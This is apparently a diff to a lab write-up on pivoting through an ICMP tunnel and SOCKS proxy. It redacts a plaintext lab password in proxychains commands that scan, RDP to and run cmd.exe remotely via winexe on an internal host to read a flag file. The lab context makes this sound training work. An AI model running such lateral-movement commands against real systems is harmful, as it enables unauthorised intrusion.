@@ -86,7 +86,7 @@ proxychains nmap -Pn -sT -sV -p3389 172.16.5.19
 
 ### 🔹 (Failed GUI Method) RDP via Proxy
 ```bash
-proxychains xfreerdp /u:victor /p:"pass@123" /v:172.16.5.19
+proxychains xfreerdp /u:victor /p:"REDACTED_PASSWORD" /v:172.16.5.19
 ```
 ⚠️ Unreliable over ICMP + SOCKS
 
@@ -96,7 +96,7 @@ proxychains xfreerdp /u:victor /p:"pass@123" /v:172.16.5.19
 
 ### 🔹 Retrieve the Flag from Attack Host
 ```bash
-proxychains winexe -U victor%pass@123 //172.16.5.19 "cmd.exe /c type C:\Users\victor\Downloads\flag.txt"
+proxychains winexe -U victor%REDACTED_PASSWORD //172.16.5.19 "cmd.exe /c type C:\Users\victor\Downloads\flag.txt"
 ```
 
 🎉 **Flag captured successfully via full ICMP + SOCKS pivot!**
@@ -115,4 +115,5 @@ proxychains winexe -U victor%pass@123 //172.16.5.19 "cmd.exe /c type C:\Users\vi
 ## 🏁 Mission Accomplished
 
 This lab demonstrates covert access to a segmented internal host via ICMP tunnel + dynamic SOCKS proxy, achieving full lateral movement and exfiltration under constrained network controls.
+
 
